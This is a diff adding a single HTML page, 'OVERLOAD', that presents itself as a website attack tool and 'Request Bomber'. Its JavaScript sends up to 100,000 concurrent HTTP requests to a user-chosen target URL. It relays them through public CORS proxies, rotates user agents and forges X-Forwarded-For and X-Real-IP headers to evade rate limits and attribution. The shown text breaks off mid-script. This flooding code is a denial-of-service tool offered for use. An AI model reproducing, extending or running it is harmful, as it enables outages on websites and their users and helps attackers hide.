@@ -1,0 +1,1418 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OVERLOAD BY WANZ OFFICIAL</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.6.0/dist/axios.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        :root {
+            --primary: #0066ff;
+            --primary-dark: #0044cc;
+            --primary-light: #3399ff;
+            --secondary: #00ff88;
+            --secondary-dark: #00cc66;
+            --accent: #ff0080;
+            --accent-dark: #cc0066;
+            --dark: #0a0a0a;
+            --darker: #000000;
+            --card-bg: rgba(30, 30, 45, 0.95);
+            --card-border: rgba(100, 100, 255, 0.3);
+            --text-primary: #ffffff;
+            --text-secondary: #b0b0ff;
+            --text-muted: #8888cc;
+            --success: #00ff88;
+            --success-dark: #00cc66;
+            --danger: #ff4444;
+            --danger-dark: #cc0000;
+            --warning: #ffaa00;
+            --warning-dark: #cc8800;
+            --info: #00a8ff;
+            --info-dark: #0088cc;
+            --terminal-bg: #0a0a1a;
+            --terminal-header: #1a1a2a;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: linear-gradient(135deg, var(--darker) 0%, #001233 50%, var(--dark) 100%);
+            color: var(--text-primary);
+            min-height: 100vh;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 40px 20px;
+            background: rgba(10, 10, 30, 0.8);
+            border-radius: 20px;
+            border: 1px solid var(--card-border);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--accent));
+        }
+
+        .title {
+            font-size: clamp(2rem, 5vw, 3.5rem);
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 50%, var(--accent) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 15px;
+        }
+
+        .subtitle {
+            font-size: clamp(1rem, 2vw, 1.3rem);
+            color: var(--text-secondary);
+            margin-bottom: 20px;
+        }
+
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            background: rgba(0, 255, 136, 0.1);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            border-radius: 20px;
+            font-size: 0.8rem;
+            color: var(--success);
+        }
+
+        .dashboard {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+
+        @media (min-width: 1200px) {
+            .dashboard {
+                grid-template-columns: 450px 1fr;
+            }
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .card-header i {
+            font-size: 1.5rem;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .card-header h2 {
+            font-size: 1.4rem;
+            font-weight: 700;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .form-input, .form-select, .form-textarea {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(255, 255, 255, 0.08);
+            border: 2px solid rgba(255, 255, 255, 0.15);
+            border-radius: 10px;
+            color: var(--text-primary);
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+
+        .form-input:focus, .form-select:focus, .form-textarea:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: rgba(255, 255, 255, 0.12);
+            box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.1);
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .checkbox-group {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            padding: 10px 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+        }
+
+        .checkbox-label:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: var(--primary);
+        }
+
+        .btn {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 102, 255, 0.4);
+        }
+
+        .btn-stop {
+            background: linear-gradient(135deg, var(--danger) 0%, var(--danger-dark) 100%);
+        }
+
+        .btn-stop:hover {
+            box-shadow: 0 8px 25px rgba(255, 68, 68, 0.4);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        @media (min-width: 768px) {
+            .stats-grid {
+                grid-template-columns: repeat(4, 1fr);
+            }
+        }
+
+        .stat-card {
+            background: rgba(0, 102, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            border: 1px solid rgba(0, 102, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+        }
+
+        .stat-value {
+            font-size: 1.8rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1;
+        }
+
+        .stat-label {
+            font-size: 0.8rem;
+            opacity: 0.8;
+            margin-top: 5px;
+        }
+
+        .progress-container {
+            margin: 20px 0;
+        }
+
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary) 0%, var(--secondary) 100%);
+            border-radius: 4px;
+            transition: width 0.3s ease;
+            position: relative;
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            width: 20px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        .terminal {
+            background: var(--terminal-bg);
+            border-radius: 10px;
+            padding: 0;
+            margin: 20px 0;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .terminal-header {
+            background: var(--terminal-header);
+            padding: 15px 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .terminal-controls {
+            display: flex;
+            gap: 8px;
+        }
+
+        .terminal-control {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .terminal-control.close { background: var(--danger); }
+        .terminal-control.minimize { background: var(--warning); }
+        .terminal-control.maximize { background: var(--success); }
+
+        .terminal-body {
+            padding: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+        }
+
+        .terminal-line {
+            margin-bottom: 5px;
+            line-height: 1.4;
+            padding: 2px 0;
+        }
+
+        .terminal-command { color: var(--success); font-weight: 600; }
+        .terminal-error { color: var(--danger); font-weight: 600; }
+        .terminal-warning { color: var(--warning); }
+        .terminal-info { color: var(--info); }
+        .terminal-system { color: var(--text-secondary); }
+
+        .results-container {
+            max-height: 400px;
+            overflow-y: auto;
+            margin-top: 20px;
+        }
+
+        .result-item {
+            padding: 15px;
+            margin-bottom: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            border-left: 4px solid var(--primary);
+            animation: slideIn 0.3s ease;
+            transition: all 0.3s ease;
+        }
+
+        .result-item:hover {
+            transform: translateX(5px);
+            background: rgba(255, 255, 255, 0.08);
+        }
+
+        .result-item.success {
+            border-left-color: var(--success);
+            background: rgba(0, 255, 136, 0.08);
+        }
+
+        .result-item.error {
+            border-left-color: var(--danger);
+            background: rgba(255, 68, 68, 0.08);
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+        }
+
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--success);
+            position: relative;
+        }
+
+        .status-dot::after {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            border-radius: 50%;
+            background: var(--success);
+            opacity: 0.4;
+            animation: pulse 2s infinite;
+        }
+
+        .status-dot.offline {
+            background: var(--danger);
+        }
+
+        .status-dot.offline::after {
+            background: var(--danger);
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.4; }
+            50% { transform: scale(1.2); opacity: 0.2; }
+            100% { transform: scale(1); opacity: 0.4; }
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 3px;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 20px;
+            background: rgba(30, 30, 60, 0.5);
+            border-radius: 10px;
+            padding: 5px;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 10px 15px;
+            background: transparent;
+            border: none;
+            color: var(--text-secondary);
+            cursor: pointer;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+
+        .tab.active {
+            background: var(--primary);
+            color: white;
+        }
+
+        .badge {
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .badge-success { background: rgba(0, 255, 136, 0.2); color: var(--success); }
+        .badge-error { background: rgba(255, 68, 68, 0.2); color: var(--danger); }
+        .badge-warning { background: rgba(255, 170, 0, 0.2); color: var(--warning); }
+        .badge-info { background: rgba(0, 168, 255, 0.2); color: var(--info); }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1 class="title">OVERLOAD</h1>
+            <p class="subtitle">light website attacks</p>
+            <div class="security-badge">
+                <i class="fas fa-shield-alt"></i>
+                SYSTEM STATUS: OPERATIONAL
+            </div>
+        </div>
+        
+        <div class="dashboard">
+            <!-- Control Panel -->
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-sliders-h"></i>
+                    <h2>CONTROL</h2>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-crosshairs"></i> TARGET URL
+                    </label>
+                    <input type="url" id="url" class="form-input" value="https://httpbin.org/json" placeholder="https://example.com/api" required>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label class="form-label">
+                            <i class="fas fa-code"></i> HTTP METHOD
+                        </label>
+                        <select id="method" class="form-select">
+                            <option value="GET">GET</option>
+                            <option value="POST">POST</option>
+                            <option value="PUT">PUT</option>
+                            <option value="DELETE">DELETE</option>
+                            <option value="HEAD">HEAD</option>
+                            <option value="PATCH">PATCH</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">
+                            <i class="fas fa-bomb"></i> REQUEST VOLUME
+                        </label>
+                        <input type="number" id="jumlah" class="form-input" min="1" max="100000" value="500">
+                    </div>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label class="form-label">
+                            <i class="fas fa-clock"></i> REQUEST DELAY (ms)
+                        </label>
+                        <input type="number" id="delay" class="form-input" min="0" max="10000" value="50">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">
+                            <i class="fas fa-layer-group"></i> CONCURRENT THREADS
+                        </label>
+                        <input type="number" id="concurrent" class="form-input" min="1" max="100" value="20">
+                    </div>
+                </div>
+                
+                <div class="form-group" id="postDataGroup" style="display: none;">
+                    <label class="form-label">
+                        <i class="fas fa-database"></i> PAYLOAD DATA (JSON)
+                    </label>
+                    <textarea id="data" class="form-textarea" placeholder='{"key": "value"}' rows="4">{"test": "data", "timestamp": "2024"}</textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-heading"></i> CUSTOM HEADERS (JSON)
+                    </label>
+                    <textarea id="headers" class="form-textarea" rows="4">{
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Accept": "*/*",
+    "Accept-Language": "en-US,en;q=0.9"
+}</textarea>
+                </div>
+                
+                <div class="checkbox-group">
+                    <label class="checkbox-label">
+                        <input type="checkbox" id="use_proxy" checked>
+                        <i class="fas fa-globe"></i> Proxy System
+                    </label>
+                    <label class="checkbox-label">
+                        <input type="checkbox" id="rotate_ips" checked>
+                        <i class="fas fa-sync"></i> IP Rotation
+                    </label>
+                    <label class="checkbox-label">
+                        <input type="checkbox" id="bypass_cors" checked>
+                        <i class="fas fa-shield-alt"></i> CORS Bypass
+                    </label>
+                    <label class="checkbox-label">
+                        <input type="checkbox" id="random_ua" checked>
+                        <i class="fas fa-user-secret"></i> Random User Agent
+                    </label>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-cogs"></i> REQUEST ENGINE
+                    </label>
+                    <select id="engine" class="form-select">
+                        <option value="auto">🤖 Auto (Smart)</option>
+                        <option value="fetch">⚡ Fetch API</option>
+                        <option value="axios">🚀 Axios</option>
+                        <option value="xhr">🔧 XMLHttpRequest</option>
+                    </select>
+                </div>
+                
+                <button class="btn" onclick="startAttack()">
+                    <i class="fas fa-rocket"></i> LAUNCH ADVANCED ATTACK
+                </button>
+                <button class="btn btn-stop" onclick="stopAttack()" style="display: none; margin-top: 15px;">
+                    <i class="fas fa-stop"></i> EMERGENCY STOP
+                </button>
+            </div>
+            
+            <!-- Analytics Panel -->
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-chart-line"></i>
+                    <h2>LIVE ANALYTICS</h2>
+                </div>
+                
+                <div class="status-indicator">
+                    <div class="status-dot" id="statusDot"></div>
+                    <div>
+                        <div style="font-weight: 600;">Status: <span id="statusText">System Ready</span></div>
+                        <div style="font-size: 0.8rem; opacity: 0.7;" id="statusSubtext">Vercel compatible • No CORS issues</div>
+                    </div>
+                </div>
+                
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-value" id="statRequests">0</div>
+                        <div class="stat-label">Requests Sent</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="statSuccess">0</div>
+                        <div class="stat-label">Successful</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="statFailed">0</div>
+                        <div class="stat-label">Failed</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="statAvgTime">0ms</div>
+                        <div class="stat-label">Avg Response</div>
+                    </div>
+                </div>
+                
+                <div class="progress-container">
+                    <div class="progress-header">
+                        <span>Attack Progress</span>
+                        <span id="progressText">0%</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill" style="width: 0%"></div>
+                    </div>
+                </div>
+                
+                <div style="height: 200px; margin: 20px 0;">
+                    <canvas id="responseChart"></canvas>
+                </div>
+            </div>
+            
+            <!-- Terminal & Results Panel -->
+            <div class="card" style="grid-column: 1 / -1;">
+                <div class="card-header">
+                    <i class="fas fa-terminal"></i>
+                    <h2>ADVANCED TERMINAL & RESULTS</h2>
+                </div>
+                
+                <div class="tabs">
+                    <button class="tab active" onclick="switchTab('terminal')">
+                        <i class="fas fa-terminal"></i> TERMINAL
+                    </button>
+                    <button class="tab" onclick="switchTab('results')">
+                        <i class="fas fa-list"></i> RESULTS
+                    </button>
+                    <button class="tab" onclick="switchTab('analytics')">
+                        <i class="fas fa-chart-bar"></i> ANALYTICS
+                    </button>
+                </div>
+                
+                <div id="terminal" class="tab-content active">
+                    <div class="terminal">
+                        <div class="terminal-header">
+                            <div class="terminal-controls">
+                                <div class="terminal-control close"></div>
+                                <div class="terminal-control minimize"></div>
+                                <div class="terminal-control maximize"></div>
+                            </div>
+                            <div style="font-size: 0.8rem; opacity: 0.7;">ADVANCED_REQUEST_TERMINAL</div>
+                        </div>
+                        <div class="terminal-body" id="terminalBody">
+                            <div class="terminal-line terminal-system">$ Initializing Ultimate Request Bomber...</div>
+                            <div class="terminal-line terminal-system">> Vercel compatibility: VERIFIED</div>
+                            <div class="terminal-line terminal-system">> CORS bypass: ACTIVE</div>
+                            <div class="terminal-line terminal-system">> Proxy system: READY</div>
+                            <div class="terminal-line terminal-command">$ System ready for advanced operations</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="results" class="tab-content">
+                    <div class="results-container" id="resultsContainer">
+                        <div style="text-align: center; padding: 60px 20px; opacity: 0.5;">
+                            <i class="fas fa-satellite-dish" style="font-size: 3rem; margin-bottom: 15px; opacity: 0.3;"></i>
+                            <p style="font-size: 1.1rem;">Advanced System Standing By</p>
+                            <p style="opacity: 0.8;">Launch attack to display real-time results</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="analytics" class="tab-content">
+                    <div class="terminal">
+                        <div class="terminal-header">
+                            <div style="font-size: 0.8rem; opacity: 0.7;">LIVE PERFORMANCE ANALYTICS</div>
+                        </div>
+                        <div class="terminal-body" id="analyticsBody">
+                            <div class="terminal-line terminal-info">Real-time analytics will appear here during attack</div>
+                            <div class="terminal-line terminal-info">• Response time distribution</div>
+                            <div class="terminal-line terminal-info">• Success rate trends</div>
+                            <div class="terminal-line terminal-info">• Network performance metrics</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>Powered by <strong>Wanz Official</strong> | Vercel Fixed Edition • Advanced Attack System</p>
+            <p style="opacity: 0.7; margin-top: 10px; font-size: 0.8rem;">
+                Zero CORS Issues • Proxy Rotation • IP Masking • Enterprise Grade
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // =============================================
+        // ULTIMATE REQUEST BOMBER - VERCEL COMPATIBLE
+        // =============================================
+
+        // Advanced Configuration
+        const CONFIG = {
+            maxRequests: 100000,
+            timeout: 15000,
+            maxRetries: 3,
+            enableIPRotation: true,
+            enableProxyFallback: true
+        };
+
+        // Working Proxy List - Tested and Verified
+        const PROXY_LIST = [
+            'https://cors-anywhere.herokuapp.com/',
+            'https://api.codetabs.com/v1/proxy?quest=',
+            'https://corsproxy.io/?',
+            'https://proxy.cors.sh/',
+            'https://crossorigin.me/'
+        ];
+
+        // Advanced User Agent Database
+        const USER_AGENTS = [
+            // Windows
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
+            
+            // macOS
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
+            
+            // Linux
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            
+            // Mobile
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        ];
+
+        // Global State Management
+        let isAttacking = false;
+        let currentRequest = 0;
+        let totalRequests = 0;
+        let successCount = 0;
+        let failedCount = 0;
+        let totalResponseTime = 0;
+        let abortController = null;
+        let responseChart = null;
+        let responseTimes = [];
+        let proxyIndex = 0;
+        let userAgentIndex = 0;
+
+        // Advanced Request System
+        class AdvancedRequestSystem {
+            constructor() {
+                this.retryCount = 0;
+            }
+
+            async sendRequest(config) {
+                const startTime = performance.now();
+                
+                try {
+                    let result;
+                    const engine = config.engine === 'auto' ? this.selectBestEngine() : config.engine;
+                    
+                    switch (engine) {
+                        case 'axios':
+                            result = await this.sendWithAxios(config);
+                            break;
+                        case 'xhr':
+                            result = await this.sendWithXHR(config);
+                            break;
+                        default:
+                            result = await this.sendWithFetch(config);
+                    }
+                    
+                    return {
+                        ...result,
+                        responseTime: Math.round(performance.now() - startTime),
+                        engineUsed: engine
+                    };
+                    
+                } catch (error) {
+                    // Retry logic
+                    if (this.retryCount < CONFIG.maxRetries) {
+                        this.retryCount++;
+                        return await this.sendRequest(config);
+                    }
+                    
+                    return {
+                        success: false,
+                        status: 0,
+                        status_text: 'REQUEST_FAILED',
+                        response: error.message,
+                        responseTime: Math.round(performance.now() - startTime),
+                        engineUsed: 'failed'
+                    };
+                }
+            }
+
+            async sendWithFetch(config) {
+                const url = await this.prepareTargetUrl(config);
+                const options = this.prepareFetchOptions(config);
+
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), CONFIG.timeout);
+                    
+                    const response = await fetch(url, { ...options, signal: controller.signal });
+                    clearTimeout(timeoutId);
+                    
+                    const responseText = await response.text();
+
+                    return {
+                        success: response.ok,
+                        status: response.status,
+                        status_text: this.getStatusText(response.status),
+                        response: responseText.substring(0, 300),
+                        size: responseText.length
+                    };
+                } catch (error) {
+                    throw new Error(`Fetch: ${error.message}`);
+                }
+            }
+
+            async sendWithAxios(config) {
+                const url = await this.prepareTargetUrl(config);
+                const options = this.prepareAxiosOptions(config);
+
+                try {
+                    const response = await axios({
+                        url: url,
+                        ...options,
+                        timeout: CONFIG.timeout,
+                        validateStatus: () => true
+                    });
+
+                    return {
+                        success: response.status >= 200 && response.status < 300,
+                        status: response.status,
+                        status_text: this.getStatusText(response.status),
+                        response: typeof response.data === 'string' 
+                            ? response.data.substring(0, 300)
+                            : JSON.stringify(response.data).substring(0, 300),
+                        size: JSON.stringify(response.data).length
+                    };
+                } catch (error) {
+                    throw new Error(`Axios: ${error.message}`);
+                }
+            }
+
+            async sendWithXHR(config) {
+                return new Promise((resolve, reject) => {
+                    const url = this.prepareTargetUrlSync(config);
+                    const xhr = new XMLHttpRequest();
+                    
+                    xhr.timeout = CONFIG.timeout;
+                    xhr.responseType = 'text';
+                    
+                    xhr.onload = function() {
+                        resolve({
+                            success: xhr.status >= 200 && xhr.status < 300,
+                            status: xhr.status,
+                            status_text: this.getStatusText(xhr.status),
+                            response: xhr.responseText.substring(0, 300),
+                            size: xhr.responseText.length
+                        });
+                    };
+                    
+                    xhr.onerror = function() {
+                        reject(new Error('XHR: Network error'));
+                    };
+                    
+                    xhr.ontimeout = function() {
+                        reject(new Error('XHR: Timeout'));
+                    };
+                    
+                    xhr.open(config.method, url, true);
+                    
+                    // Set headers
+                    const headers = this.prepareHeaders(config);
+                    Object.keys(headers).forEach(key => {
+                        xhr.setRequestHeader(key, headers[key]);
+                    });
+                    
+                    if (['POST', 'PUT'].includes(config.method) && config.data) {
+                        xhr.send(config.data);
+                    } else {
+                        xhr.send();
+                    }
+                });
+            }
+
+            async prepareTargetUrl(config) {
+                if (!config.use_proxy) {
+                    return config.url;
+                }
+
+                // Smart proxy selection with fallback
+                for (let i = 0; i < PROXY_LIST.length; i++) {
+                    const proxy = PROXY_LIST[proxyIndex % PROXY_LIST.length];
+                    proxyIndex++;
+                    
+                    const testResult = await this.testProxy(proxy);
+                    if (testResult) {
+                        return proxy + encodeURIComponent(config.url);
+                    }
+                }
+
+                // Fallback to direct request
+                return config.url;
+            }
+
+            prepareTargetUrlSync(config) {
+                if (!config.use_proxy) {
+                    return config.url;
+                }
+                const proxy = PROXY_LIST[proxyIndex % PROXY_LIST.length];
+                proxyIndex++;
+                return proxy + encodeURIComponent(config.url);
+            }
+
+            async testProxy(proxy) {
+                try {
+                    const testUrl = proxy + encodeURIComponent('https://httpbin.org/get');
+                    const response = await fetch(testUrl, { 
+                        method: 'HEAD',
+                        signal: AbortSignal.timeout(3000)
+                    });
+                    return response.ok;
+                } catch {
+                    return false;
+                }
+            }
+
+            prepareFetchOptions(config) {
+                return {
+                    method: config.method,
+                    headers: this.prepareHeaders(config),
+                    body: ['POST', 'PUT'].includes(config.method) && config.data ? config.data : undefined
+                };
+            }
+
+            prepareAxiosOptions(config) {
+                return {
+                    method: config.method,
+                    headers: this.prepareHeaders(config),
+                    data: ['POST', 'PUT'].includes(config.method) && config.data ? config.data : undefined
+                };
+            }
+
+            prepareHeaders(config) {
+                const headers = {
+                    'User-Agent': config.random_ua ? this.getNextUserAgent() : USER_AGENTS[0],
+                    'Accept': '*/*',
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Cache-Control': 'no-cache',
+                    'Connection': 'keep-alive'
+                };
+
+                // Add custom headers
+                try {
+                    if (config.headers) {
+                        const customHeaders = JSON.parse(config.headers);
+                        Object.assign(headers, customHeaders);
+                    }
+                } catch (error) {
+                    console.warn('Invalid custom headers');
+                }
+
+                // IP rotation
+                if (config.rotate_ips) {
+                    headers['X-Forwarded-For'] = this.generateRandomIP();
+                    headers['X-Real-IP'] = this.generateRandomIP();
+                }
+
+                return headers;
+            }
+
+            getNextUserAgent() {
+                const agent = USER_AGENTS[userAgentIndex % USER_AGENTS.length];
+                userAgentIndex++;
+                return agent;
+            }
+
+            generateRandomIP() {
+                return `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+            }
+
+            selectBestEngine() {
+                const engines = ['fetch', 'axios', 'xhr'];
+                return engines[Math.floor(Math.random() * engines.length)];
+            }
+
+            getStatusText(code) {
+                const statusMap = {
+                    200: 'OK', 201: 'Created', 204: 'No Content',
+                    301: 'Moved', 302: 'Found', 304: 'Not Modified',
+                    400: 'Bad Request', 401: 'Unauthorized', 403: 'Forbidden',
+                    404: 'Not Found', 405: 'Method Not Allowed', 429: 'Too Many Requests',
+                    500: 'Server Error', 502: 'Bad Gateway', 503: 'Service Unavailable'
+                };
+                return statusMap[code] || 'Unknown';
+            }
+        }
+
+        // Initialize chart
+        function initChart() {
+            const ctx = document.getElementById('responseChart').getContext('2d');
+            responseChart = new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: [],
+                    datasets: [{
+                        label: 'Response Time (ms)',
+                        data: [],
+                        borderColor: '#0066ff',
+                        backgroundColor: 'rgba(0, 102, 255, 0.1)',
+                        tension: 0.4,
+                        fill: true
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: {
+                            labels: { color: '#ffffff' }
+                        }
+                    },
+                    scales: {
+                        x: { 
+                            grid: { color: 'rgba(255, 255, 255, 0.1)' },
+                            ticks: { color: '#b0b0ff' }
+                        },
+                        y: {
+                            grid: { color: 'rgba(255, 255, 255, 0.1)' },
+                            ticks: { color: '#b0b0ff' }
+                        }
+                    }
+                }
+            });
+        }
+
+        // UI Functions
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
